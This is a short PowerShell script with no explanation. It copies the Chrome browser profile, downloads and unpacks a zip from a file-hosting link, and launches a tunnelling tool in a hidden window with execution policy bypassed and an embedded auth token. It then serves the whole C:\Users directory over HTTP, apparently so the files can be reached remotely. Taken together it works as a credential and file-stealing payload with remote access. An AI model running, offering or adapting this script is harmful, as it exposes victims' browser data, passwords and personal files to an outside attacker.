robocopy 'AppData\Local\Google\Chrome\User Data\Default' 'Documents/History File' /E
Invoke-WebRequest -Uri https://download2325.mediafire.com/0couy9j6ixog/8z0o4ebn18a5pxj/settool.zip -OutFile (Join-Path  Documents settool.zip)
Add-Type -AssemblyName System.IO.Compression.FileSystem
 function Unzip
 {
     param([string]$zipfile, [string]$outpath)

     [System.IO.Compression.ZipFile]::ExtractToDirectory($zipfile, $outpath)
}

Unzip "Documents\settool.zip" "Documents"
add-appxpackage -path "Documents\settool\python310.appx"
cd Documents
cd settool
start powershell {-exec bypass -WindowStyle Hidden IEX(./localtonet.exe authtoken gzPhq7vUOD3VfGLkYt29iEdj01yXcNmZI)} 
cd 'C:\'
mkdir PythonSoftwareFoundation.Python.3.10_3.10.2032.0_x64__qbz5n2kfra8p0
robocopy 'C:\Program Files\WindowsApps\PythonSoftwareFoundation.Python.3.10_3.10.2032.0_x64__qbz5n2kfra8p0' 'C:\PythonSoftwareFoundation.Python.3.10_3.10.2032.0_x64__qbz5n2kfra8p0' /E
cd "C:\PythonSoftwareFoundation.Python.3.10_3.10.2032.0_x64__qbz5n2kfra8p0"
./python.exe -m http.server 4040 --bind 127.0.0.1 --directory "C:\\Users\"